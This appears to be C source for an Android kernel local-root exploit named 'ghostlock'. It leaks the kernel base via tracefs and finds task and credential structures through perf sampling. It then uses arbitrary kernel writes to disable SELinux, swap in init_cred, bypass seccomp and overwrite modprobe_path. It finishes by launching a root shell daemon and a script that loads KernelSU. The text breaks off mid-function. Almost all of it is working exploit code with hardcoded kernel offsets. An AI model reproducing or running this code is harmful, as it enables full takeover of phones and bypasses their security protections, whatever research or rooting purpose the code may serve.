int ghostlock_start_root_daemon_early(void) {
  const char *allowed_env = getenv("GHOSTLOCK_ALLOWED_UID");
  const char *allowed_uid =
      (allowed_env && allowed_env[0]) ? allowed_env : "2000";
  return start_root_daemon(allowed_uid);
}

static void init_runtime_paths(void) {
  const char *home = getenv("GHOSTLOCK_HOME");
  if (!home || !home[0]) home = getenv("TMPDIR");
  if (!home || !home[0]) home = "/data/local/tmp";

  snprintf(g_home_dir, sizeof(g_home_dir), "%s", home);
  size_t n = strlen(g_home_dir);
  while (n > 1 && g_home_dir[n - 1] == '/') {
    g_home_dir[--n] = '\0';
  }
  snprintf(g_root_script_path, sizeof(g_root_script_path),
           "%s/.ghostlock_root.sh", g_home_dir);
  pr_info("runtime home=%s script=%s\n", g_home_dir, g_root_script_path);
}

static void init_durable_log(void) {
  const char *path = getenv("GHOSTLOCK_LOG");
  if (!path || !path[0]) return;
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_SYNC | O_CLOEXEC,
                0600);
  if (fd < 0) {
    pr_warning("durable log open failed path=%s errno=%d\n", path, errno);
    return;
  }
  dup2(fd, STDOUT_FILENO);
  dup2(fd, STDERR_FILENO);
  if (fd > STDERR_FILENO) close(fd);
  if (getenv("GHOSTLOCK_UNBUFFERED")) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
  }
  pr_info("durable log path=%s\n", path);
}

static void write_root_script(void) {
  char script[4096];
  int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_warning("open root script failed path=%s errno=%d\n",
               g_root_script_path, errno);
    return;
  }

  int n = snprintf(
      script, sizeof(script),
      "#!/system/bin/sh\n"
      "HOME_DIR='%s'\n"
      "LOG=\"$HOME_DIR/.ghostlock_ksu.log\"\n"
      "LOADER=\"/data/local/tmp/lkmloader.ko\"\n"
      "MODULE=\"/data/local/tmp/kernelsu.ko\"\n"
      "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
      "chmod 644 \"$LOG\" 2>/dev/null\n"
      "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
      "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
      "echo \"[*] selinux_context=$(cat /proc/self/attr/current 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] direct loader=$LOADER module=$MODULE\" >>\"$LOG\"\n"
      "echo \"[*] direct loader_file=$(ls -l \"$LOADER\" 2>/dev/null)\" >>\"$LOG\"\n"
      "echo \"[*] direct module_file=$(ls -l \"$MODULE\" 2>/dev/null)\" >>\"$LOG\"\n"
      "if [ ! -r \"$LOADER\" ] || [ ! -r \"$MODULE\" ]; then\n"
      "  echo '[!] direct loader or kernelsu module missing' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "if ! cd /data/local/tmp; then\n"
      "  echo '[!] direct loader chdir failed' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo \"[*] direct insmod begin cwd=$(pwd)\" >>\"$LOG\"\n"
      "/system/bin/insmod lkmloader.ko module_path=kernelsu.ko >>\"$LOG\" 2>&1\n"
      "INSMOD_RC=$?\n"
      "echo \"[*] direct insmod exit=$INSMOD_RC\" >>\"$LOG\"\n"
      "if [ \"$INSMOD_RC\" -ne 0 ]; then\n"
      "  echo '[!] direct lkmloader insmod failed' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "if ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
      "  echo '[!] KernelSU module not visible after direct insmod' | tee -a \"$LOG\"\n"
      "  exit 1\n"
      "fi\n"
      "echo '[+] KernelSU module loaded' | tee -a \"$LOG\"\n"
      "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "POLICY=/sys/fs/selinux/policy\n"
      "for i in $(seq 1 50); do [ -s \"$POLICY\" ] && break; sleep 0.1; done\n"
      "load_policy \"$POLICY\" >>\"$LOG\" 2>&1\n"
      "RC=$?\n"
      "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
      "echo \"[*] policy fixup rc=$RC\" >>\"$LOG\"\n"
      "echo '[!] Reconnect Wi-Fi or mobile data if network is unavailable' | tee -a \"$LOG\"\n",
      g_home_dir);
  if (n < 0 || n >= (int)sizeof(script)) {
    pr_warning("root script too long\n");
    close(sfd);
    return;
  }
  if (write(sfd, script, (size_t)n) != n) {
    pr_warning("write root script failed errno=%d\n", errno);
  }
  close(sfd);
  chmod(g_root_script_path, 0755);
}

static int kernelsu_module_loaded(void) {
  FILE *modules = fopen("/proc/modules", "r");
  if (!modules) return 0;

  char line[256];
  int loaded = 0;
  while (fgets(line, sizeof(line), modules)) {
    char name[64];
    if (sscanf(line, "%63s", name) == 1 && strcmp(name, "kernelsu") == 0) {
      loaded = 1;
      break;
    }
  }
  fclose(modules);
  return loaded;
}

/* The external late-load helper cannot be used as a standalone client: its
 * --late-load mode verifies a ticket/payload environment first.  Ghostlock
 * keeps only the root UMH daemon and local Unix-socket boundary, with both
 * ends implemented locally. */
static int run_local_late_load(void) {
  const char *helper_path = local_root_helper_path();
  pid_t child = fork();
  if (child < 0) {
    pr_warning("local late-load client fork failed errno=%d\n", errno);
    return 0;
  }
  if (child == 0) {
    prctl(PR_SET_NAME, "ghostlock-ksu-client");
    execl(helper_path, "ghostlock-helper", "--late-load", NULL);
    _exit(127);
  }

  int status = 0;
  int waited_ms = 0;
  for (;;) {
    pid_t waited = waitpid(child, &status, WNOHANG);
    if (waited == child) break;
    if (waited < 0) {
      pr_warning("local late-load client wait failed errno=%d\n", errno);
      return 0;
    }
    if (waited_ms >= 60000) {
      pr_warning("local late-load client timed out; killing pid=%d\n", child);
      kill(child, SIGKILL);
      waitpid(child, &status, 0);
      return 0;
    }
    usleep(100000);
    waited_ms += 100;
  }

  if (WIFEXITED(status)) {
    int rc = WEXITSTATUS(status);
    pr_info("local late-load client exit=%d\n", rc);
    return rc == 0;
  }
  if (WIFSIGNALED(status)) {
    pr_warning("local late-load client signal=%d\n", WTERMSIG(status));
  }
  return 0;
}

/* The UMH daemon already owns uid 0 and exposes the authenticated shell
 * service on temp_su.sock. Keep the console path independent from KernelSU:
 * exec the existing helper client with no command so its daemon-side default
 * is /system/bin/sh. This keeps adb's standard descriptors attached to the
 * resulting root shell. */
static int handoff_root_shell(void) {
  const char *helper_path = local_root_helper_path();
  pr_info("root shell handoff helper=%s\n", helper_path);
  fflush(stdout);
  fflush(stderr);
  execl(helper_path, "ghostlock-helper", (char *)NULL);
  int saved_errno = errno;
  pr_warning("root shell helper exec failed errno=%d\n", saved_errno);
  return 127;
}

static int root_shell_requested(int argc, char **argv) {
  if (argc >= 2 && argv && strcmp(argv[1], "--root-shell") == 0) {
    return 1;
  }
  const char *env = getenv("GHOSTLOCK_ROOT_SHELL");
  return env && env[0] && strcmp(env, "0") != 0;
}

#define PERF_TASK_MAX_CANDS 32

struct task_report {
  int ncands;
  int pad;
  uintptr_t cands[PERF_TASK_MAX_CANDS];
};

static int perf_task_ncands;
static uintptr_t perf_task_cands[PERF_TASK_MAX_CANDS];

/* Find a task through perf sample records. Hammering PR_SET_NAME keeps
 * both current and current->comm in the sampled kernel registers, which
 * lets the parent validate a task base against its comm address. */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) {
    pr_warning("perf_event_open failed errno=%d\n", errno);
    return 0;
  }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(fd);
    return 0;
  }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  int sample_getuid_all = getenv("PERF_GETUID_ALL") != NULL;
  int sample_getuid =
      sample_getuid_all || getenv("PERF_GETUID") != NULL;
  int sample_getpid = getenv("PERF_TASK_GETPID") != NULL;
  int sample_iterations = sample_getuid ? 2000000 : 500000;
  for (volatile int i = 0; i < sample_iterations; i++) {
    if (sample_getuid) {
      syscall(__NR_getuid);
    } else if (sample_getpid) {
      syscall(__NR_getpid);
    } else {
      syscall(__NR_prctl, PR_SET_NAME, "e", 0, 0, 0);
    }
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      uint64_t sample_ip = *(uint64_t *)p;
      p += 8;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        if (sample_getpid) {
          uintptr_t getpid_entry =
              text_addr(KIMAGE_TEXT_BASE + 0x000ce5e4ULL);
          uintptr_t task_pid_ns_entry =
              text_addr(KIMAGE_TEXT_BASE + 0x000dc658ULL);
          if ((sample_ip >= getpid_entry + 0x18 &&
               sample_ip < getpid_entry + 0x1c) ||
              (sample_ip >= task_pid_ns_entry + 0x1c &&
               sample_ip < task_pid_ns_entry + 0xc8)) {
            uint64_t v =
                sample_ip < task_pid_ns_entry
                    ? regs[0]
                    : regs[21];
            if (v > 0xffffff8000000000ULL && v < 0xffffffc000000000ULL)
              cands[nc++] = v;
          }
        } else if (sample_getuid) {
          /* x8 holds current->cred in the getuid sample window. The ALL
           * variant widens only the PC filter, never the register set. */
          uintptr_t getuid_entry =
              text_addr(KIMAGE_TEXT_BASE + 0x000ce68cULL);
          if (sample_getuid_all ||
              (sample_ip >= getuid_entry + 0xc &&
               sample_ip < getuid_entry + 0x14)) {
            uint64_t v = regs[8];
            if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
              cands[nc++] = v;
          }
        } else {
          for (int i = 0; i < 32 && nc < 256; i++) {
            uint64_t v = regs[i];
            if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
              cands[nc++] = v;
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  perf_task_ncands = 0;
  for (;;) {
    uintptr_t best = 0;
    int best_cnt = 0;
    for (int i = 0; i < nc; i++) {
      int picked = 0;
      for (int j = 0; j < perf_task_ncands; j++) {
        if (perf_task_cands[j] == cands[i]) {
          picked = 1;
          break;
        }
      }
      if (picked) continue;
      int cnt = 0;
      for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
      if (cnt > best_cnt) {
        best_cnt = cnt;
        best = cands[i];
      }
    }
    if (!best) break;
    perf_task_cands[perf_task_ncands] = best;
    perf_task_cand_votes[perf_task_ncands] = best_cnt;
    perf_task_ncands++;
    if (perf_task_ncands >= PERF_TASK_MAX_CANDS) break;
  }
  for (int i = 0; i < perf_task_ncands; i++) {
    pr_info("perf cand[%d]: 0x%016zx (%d/%d votes)\n", i,
            perf_task_cands[i], perf_task_cand_votes[i], nc);
  }
  return perf_task_cands[0];
}

uintptr_t ghostlock_perf_current_cred(void) {
  setenv("PERF_GETUID", "1", 1);
  return perf_find_task();
}

uintptr_t ghostlock_perf_current_task(void) {
  unsetenv("PERF_GETUID");
  setenv("PERF_TASK_GETPID", "1", 1);
  return perf_find_task();
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

/* W3a: catch the filter's SIGSYS so a missed write costs a retry, not the
 * child. */
static volatile sig_atomic_t g_sigsys_hit;
static void sigsys_probe_handler(int sig, siginfo_t *info, void *uctx) {
  (void)sig; (void)info; (void)uctx;
  g_sigsys_hit = 1;
}

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  setpgid(0, 0);  /* own group so the parent can kill the whole late-load
                   * tree (sh + ksud) on timeout */
  fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* ksud-spawned daemons must not
                                          * inherit the report pipe */
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  /* W3a probe: don't let the filter's SIGSYS kill us. */
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigsys_probe_handler;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGSYS, &sa, NULL);
  int no_perf = getenv("CHILD_NOPERF") != NULL;
  uintptr_t my_task = no_perf ? 0 : perf_find_task();
  struct task_report taskrep;
  memset(&taskrep, 0, sizeof(taskrep));
  if (!no_perf) {
    taskrep.ncands = my_task ? perf_task_ncands : 0;
    memcpy(taskrep.cands, perf_task_cands, sizeof(taskrep.cands));
  }
  prctl(PR_SET_NAME, "ghostleaf_0123456789");
  write(p->task_w, &taskrep, sizeof(taskrep));
  close(p->task_w);
  if (!no_perf && !my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'F') {
      /* Forked finit_module probe after W3b zeroed seccomp.mode: mode==2
       * re-arms TIF_SECCOMP on fork (probe hits the filter); mode==0 lets it
       * run filter-free to a normal errno. Forked so SIGSYS costs only this. */
      uint32_t code = 0xffffffff;
      int probe_pipe[2];
      if (pipe(probe_pipe) == 0) {
        pid_t probe = fork();
        if (probe == 0) {
          close(probe_pipe[0]);
          /* Forked probe: keep default SIGSYS so the filter kills it. */
          signal(SIGSYS, SIG_DFL);
          errno = 0;
          long r = syscall(__NR_finit_module, 0, 0, 0);
          uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
          ssize_t nw = write(probe_pipe[1], &out, sizeof(out));
          (void)nw;
          _exit(0);
        }
        close(probe_pipe[1]);
        int st = 0;
        if (waitpid(probe, &st, 0) == probe && WIFEXITED(st)) {
          ssize_t nr = read(probe_pipe[0], &code, sizeof(code));
          if (nr != (ssize_t)sizeof(code)) code = 0xfffffffe;
        } else {
          code = 0xfffffffd; /* probe killed by a signal (SIGSYS) */
        }
        close(probe_pipe[0]);
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'D') {
      /* W3a direct probe (a fork would re-inherit the filter): SIGSYS caught
       * -> filter active; normal errno -> TIF_SECCOMP cleared. */
      uint32_t code = 0xffffffff;
      g_sigsys_hit = 0;
      errno = 0;
      long r = syscall(__NR_finit_module, 0, 0, 0);
      if (g_sigsys_hit) {
        code = 0xfffffffd;
      } else {
        code = (r == 0) ? 0 : (uint32_t)errno;
      }
      write(p->uid_w, &code, sizeof(code));
    }
    else if (cmd == 'M') {
      /* Report comm length + first byte to tell which side a leaf=1 write
       * landed: comm "ghostleaf_012345" zeroed at [target] reads len 0, at
       * [target+8] len 8, untouched len 15. */
      char comm[24] = {0};
      FILE *cf = fopen("/proc/self/comm", "r");
      if (cf) {
        size_t n = fread(comm, 1, sizeof(comm) - 1, cf);
        (void)n;
        fclose(cf);
      }
      size_t len = strlen(comm);
      while (len > 0 && comm[len - 1] == '\n') {
        comm[len - 1] = 0;
        len--;
      }
      uint32_t report =
        ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
      write(p->uid_w, &report, sizeof(report));
    }
    else if (cmd == 'R') {
      const char *allowed_env = getenv("GHOSTLOCK_ALLOWED_UID");
      const char *allowed_uid =
          (allowed_env && allowed_env[0]) ? allowed_env : "2000";
      uint32_t daemon_ready = start_root_daemon(allowed_uid);
      write(p->uid_w, &daemon_ready, sizeof(daemon_ready));
    }
    else if (cmd == 'G' || cmd == 'X') break;
  }
  close(p->cmd_r);
  if (getuid() != 0) { close(p->uid_w); _exit(1); }
  /* Keep the app-side pipe/exit fds out of the late-load worker chain: a
   * lingering holder (ksud/zygisk daemons) would keep the app's read and
   * waitFor blocked after this process exits. */
  for (int fd = 3; fd < 1024; fd++) {
    int fl = fcntl(fd, F_GETFD);
    if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
  }
  pid_t worker = fork();
  if (worker == 0) {
    execl("/system/bin/sh", "sh", g_root_script_path, NULL);
    _exit(1);
  }
  int wst = -1;
  if (worker > 0) waitpid(worker, &wst, 0);
  /* Report whether the script reached the loaded-module line: only this root
   * child can read the root-owned log, and the parent loses /proc/modules
   * once enforcing is restored. */
  uint32_t report = 0;
  char ksu_log_path[320];
  snprintf(ksu_log_path, sizeof(ksu_log_path), "%s/.ghostlock_ksu.log", g_home_dir);
  FILE *lf = fopen(ksu_log_path, "r");
  if (lf) {
    char line[256];
    while (fgets(line, sizeof(line), lf)) {
      if (strstr(line, "[+] KernelSU module loaded")) report = 1;
    }
    fclose(lf);
  }
  ssize_t nw = write(p->uid_w, &report, sizeof(report));
  (void)nw;
  close(p->uid_w);
  _exit(0);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

typedef int (*write_stage_verify_fn)(void *context);

static int retry_write_stage(
    const char *stage, uintptr_t target, int mode, int attempts,
    useconds_t settle_usec, write_stage_verify_fn verify, void *context,
    int leaf) {
  for (int attempt = 1; attempt <= attempts; attempt++) {
    pr_info("%s attempt %d/%d\n", stage, attempt, attempts);
    if (attempt == 1) slab_drain();
    int routed = do_one_write(target, stage, mode, leaf);
    if (!routed) {
      pr_warning("%s attempt %d route failed; backing off\n", stage, attempt);
      usleep(100000);
      continue;
    }
    if (settle_usec) usleep(settle_usec);
    if (verify(context)) return 1;
    usleep(50000);
  }
  return 0;
}

static int verify_selinux_stage(void *context) {
  (void)context;
  if (!check_selinux_off()) return 0;
  pr_success("SELinux permissive\n");
  return 1;
}

struct w2_stage_context {
  struct child_pipes *pipes;
};

struct w3_stage_context {
  struct child_pipes *pipes;
  int leaf_to_target8; /* 1: leaf write lands on [target+8], 0: [target] */
};

static int verify_w2_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "C", 1) != 1) return 0;

  uint32_t child_uid = 9999;
  if (read(stage->pipes->uid_r, &child_uid, sizeof(child_uid)) !=
      (ssize_t)sizeof(child_uid)) {
    return 0;
  }
  pr_info("child uid = %u\n", child_uid);
  if (child_uid != 0) return 0;
  pr_success("child is root!\n");
  return 1;
}

static int verify_seccomp_probe_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "F", 1) != 1) return 0;

  uint32_t code = 0;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    return 0;
  }
  pr_info("seccomp finit_module probe = 0x%x\n", code);
  /* SIGSYS (0xfffffffd) = filter kills; EPERM/ENOSYS = its RET_ERRNO actions.
   * With init_cred + permissive SELinux a real probe fails with a normal
   * errno instead. */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("child seccomp filter bypassed (finit_module errno=%u)\n", code);
  return 1;
}

static int verify_w3a_direct_stage(void *context) {
  struct w2_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "D", 1) != 1) return 0;

  uint32_t code = 0xffffffff;
  if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
      (ssize_t)sizeof(code)) {
    pr_warning("W3a direct probe: no reply (child lost)\n");
    return 0;
  }
  pr_info("W3a direct finit_module probe = 0x%x\n", code);
  /* A normal errno means TIF_SECCOMP is clear. SIGSYS (0xfffffffd) means the
   * filter still caught the probe (child survives via its handler);
   * EPERM/ENOSYS count as failure because zeroing mode with TIF_SECCOMP set
   * would BUG(). */
  if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
      code == 1 || code == 38) {
    return 0;
  }
  pr_success("W3a direct probe: filter bypassed in child (errno=%u)\n", code);
  return 1;
}

static int verify_leaf_dir_stage(void *context) {
  struct w3_stage_context *stage = context;
  if (write(stage->pipes->cmd_w, "M", 1) != 1) return 0;

  uint32_t report = 0;
  if (read(stage->pipes->uid_r, &report, sizeof(report)) !=
      (ssize_t)sizeof(report)) {
    return 0;
  }
  size_t len = (report >> 8) & 0xff;
  unsigned char c0 = (unsigned char)(report & 0xff);
  pr_info("leaf dir probe comm_len=%u comm[0]=%02x\n", (unsigned)len, c0);
  if (len == 8) {
    stage->leaf_to_target8 = 1;
    pr_info("leaf=1 write lands on [target+8]\n");
    return 1;
  }
  if (len == 0) {
    stage->leaf_to_target8 = 0;
    pr_info("leaf=1 write lands on [target]\n");
    return 1;
  }
  if (len == 15) {
    pr_warning("leaf dir probe: comm untouched (write missed the comm field)\n");
    return 0;
  }
  pr_warning("leaf dir probe ambiguous (len=%u c0=%02x)\n", (unsigned)len, c0);
  return 0;
}

int run_exploit(int argc, char **argv) {
  disable_rseq_for_thread();
  set_unbuffer();
  signal(SIGPIPE, SIG_IGN);
  set_limit();
  init_runtime_paths();
  init_durable_log();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  if (active_offsets->tracefs_leak) {
    /* Samsung devices randomize the kernel slide every boot (physical and
     * virtual offsets are equal on arm64).  Discover it before any write:
     * with a wrong slide every physmap-derived target is off by up to
     * 0x1f0000 and the write corrupts random kernel memory. */
    uint64_t leaked_base = 0;
    if (!tracefs_leak_kernel_base(&leaked_base)) {
      pr_error("tracefs slide leak failed; aborting instead of writing "
               "with a guessed slide\n");
      return 1;
    }
    kaslr_base = leaked_base;
    kaslr_slide = leaked_base - KIMAGE_TEXT_BASE;
    p0_kernel_phys_load += kaslr_slide;
    pr_success("tracefs leak base=%016llx slide=%016llx phys_load=%016llx\n",
               (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide,
               (unsigned long long)p0_kernel_phys_load);
  }

  timer_reset();
  TIMER("exploit start");

  if (getenv("KSNITCH_ONLY")) {
    slab_drain();
    uintptr_t base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    pr_success("KSNITCH_ONLY base=%016zx\n", base);
    close_reclaim_sockets();
    return base ? 0 : 1;
  }

  if (getenv("MODPROBE_ONLY")) {
    uintptr_t modprobe_path = text_addr(KIMAGE_TEXT_BASE + 0x020d2458ULL);
    uint64_t new_path = 0x0000782f706d742fULL; /* "/tmp/x" */
    int wrote = 0;
    for (int attempt = 1; attempt <= 12 && !wrote; attempt++) {
      pr_info("MODPROBE_ONLY attempt %d/12 target=0x%016zx\n",
              attempt, modprobe_path);
      slab_drain();
      wrote = do_one_write_value(
          modprobe_path, new_path, "modprobe_path=/tmp/x", 3, 0);
      if (!wrote) usleep(50000);
    }
    pr_success("MODPROBE_ONLY complete wrote=%d\n", wrote);
    return wrote ? 0 : 1;
  }

  /* W1: disable SELinux before task discovery. untrusted_app may not be able
   * to read enforce while it is still enforcing, so attempt W1 regardless.
   * UMH-root devices write permissive inside the UMH staging instead, right
   * before queueing the work item (shortest permissive window,
   * no separate W1 route cycle). */
  int perf_only = getenv("PERF_ONLY") != NULL;
  int cfi_after_selinux = getenv("CFI_AFTER_SELINUX") != NULL;
  int cfi_only = getenv("CFI_ONLY") != NULL ||
                 getenv("CFI_CRED_ONLY") != NULL ||
                 getenv("CFI_TASK_ONLY") != NULL;
  cfi_only = cfi_only && !cfi_after_selinux;
  int selinux_ok = (perf_only || cfi_only) ? 1 : check_selinux_off();
  if (active_offsets->umh_root) {
    pr_info("UMH device: SELinux permissive deferred to the UMH stage\n");
  } else if (perf_only || cfi_only) {
    pr_info("%s: skipping SELinux write\n",
            cfi_only ? "CFI_ONLY" : "PERF_ONLY");
  } else if (!selinux_ok) {
    if (!enforce_readable()) {
      pr_warning("SELinux enforce unreadable; assuming enforcing and running W1\n");
    }
    TIMER("pre-W1 drain");
    uintptr_t selinux_target = text_addr(SELINUX_ENFORCING);
    int rb_mode = getenv("RB_CRED_ONLY") != NULL;
    int one_w1 = rb_mode || cfi_after_selinux;
    int side_count = one_w1 ? 1 : 2;
    int route_attempts = one_w1 ? 1 : 8;
    for (int side = 0; side < side_count && !selinux_ok; side++) {
      uintptr_t target = selinux_target - (uintptr_t)(side * 8);
      if (cfi_after_selinux) {
        const char *w1_delay = getenv("W1_DELAY_USEC");
        setenv("FOPS_DELAY_USEC", w1_delay && *w1_delay ? w1_delay : "40000",
               1);
      }
      selinux_ok = retry_write_stage(
          side ? "W1b: SELinux shifted" : "W1a: SELinux",
          target, 1, route_attempts, 100000, verify_selinux_stage, NULL, 0);
    }
    if (!selinux_ok) {
      pr_warning("Write 1 failed\n");
      return 1;
    }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already permissive\n");
  }
  if (getenv("SELINUX_ONLY")) {
    pr_success("SELINUX_ONLY complete enforce_off=%d\n", check_selinux_off());
    return check_selinux_off() ? 0 : 1;
  }

  if (getenv("RB_CRED_ONLY")) {
    char allowed_uid[16];
    snprintf(allowed_uid, sizeof(allowed_uid), "%u", getuid());
    uintptr_t task = ghostlock_perf_current_task();
    const char *side_value = getenv("RB_CRED_SIDE");
    char *side_end = NULL;
    long side = side_value && *side_value ? strtol(side_value, &side_end, 0) : 0;
    if (!side_value || !*side_value || *side_end || side < 0 || side > 1) {
      pr_error("RB_CRED_ONLY invalid RB_CRED_SIDE=%s (expected 0 or 1)\n",
               side_value ? side_value : "");
      return 1;
    }
    pr_info("RB_CRED_ONLY task=%016zx side=%ld\n", task, side);
    if (!task || !is_direct_ptr(task) || (task & 0x3f)) return 1;
    uintptr_t target = task + TASK_CRED_OFF - (uintptr_t)(side * 8);
    pr_info("RB_CRED_ONLY target=%016zx\n", target);
    slab_drain();
    int routed = do_one_write_value(
        target, text_addr(INIT_CRED), "rb init_cred", 2, 0);
    pr_info("RB_CRED_ONLY route=%d uid=%d\n", routed, getuid());
    if (getuid() == 0) {
      /* copy_creds() gives a normal forked child a consistent credential pair
       * copied from current->cred. The parent remains inconsistent and must
       * never reach commit_creds(); it parks after launching the helper. */
      int daemon_ready = start_root_daemon(allowed_uid);
      pr_success("RB_CRED_ONLY root daemon=%d uid=%d selinux=%d\n",
                 daemon_ready, getuid(), check_selinux_off());
      if (daemon_ready) {
        for (;;) sleep(60);
      }
      return 1;
    }
    return 1;
  }

  if (getenv("CFI_TASK_ONLY")) {
    char allowed_uid[16];
    snprintf(allowed_uid, sizeof(allowed_uid), "%u", getuid());
    setenv("GHOSTLOCK_ALLOWED_UID", allowed_uid, 1);
    setenv("CFI_BOOTSTRAP", "canon", 1);
    setenv("CFI_STAGE_IN_CONSUMER", "1", 1);
    int inplace_cred = getenv("CFI_INPLACE_SELF_CRED") != NULL;
    setenv(inplace_cred ? "CFI_SELF_PERF_CRED" : "CFI_SELF_PERF_TASKSWAP",
           "1", 1);
    if (inplace_cred) {
      setenv("CFI_BLIND_CRED", "1", 1);
    }
    if (cfi_after_selinux) {
      setenv(inplace_cred ? "CFI_PRECOMPUTE_CRED" : "CFI_PRECOMPUTE_TASK",
             "1", 1);
      const char *cfi_delay = getenv("CFI_DELAY_USEC");
      setenv("FOPS_DELAY_USEC", cfi_delay && *cfi_delay ? cfi_delay : "50000",
             1);
    }
    const char *bootstrap = getenv("CFI_BOOTSTRAP");
    const char *delay = getenv("FOPS_DELAY_USEC");
    pr_info("CFI_TASK_ONLY self-route bootstrap=%s delay=%s allowed_uid=%s\n",
            bootstrap ? bootstrap : "default",
            delay ? delay : "default", allowed_uid);
    slab_drain();
    int routed = do_one_write(0, "CFI self patch", 0, 0);
    pr_info("CFI_TASK_ONLY route=%d cfi=%d step=%d errno=%d\n",
            routed, atomic_load(&cfi_stage_done), cfi_last_step,
            cfi_last_errno);

    int root_uid = getuid();
    int task_selinux_ok = check_selinux_off();
    pr_info("CFI_TASK_ONLY self uid=%d selinux_ok=%d\n",
            root_uid, task_selinux_ok);
    if (root_uid != 0 || !task_selinux_ok) return 1;

    int daemon_ready = start_root_daemon(allowed_uid);
    pr_success("CFI_TASK_ONLY root daemon=%d uid=%d selinux=%d\n",
               daemon_ready, getuid(), check_selinux_off());
    return daemon_ready ? 0 : 1;
  }

  if (getenv("CFI_CRED_ONLY")) {
    setenv("PERF_GETUID", "1", 1);
    setenv("CFI_STAGE_IN_CONSUMER", "1", 1);
    setenv("CFI_BLIND_CRED", "1", 1);
    struct child_pipes pipes;
    pid_t child = spawn_child(&pipes);
    if (child < 0) {
      pr_warning("CFI_CRED_ONLY fork failed\n");
      return 1;
    }

    struct task_report report;
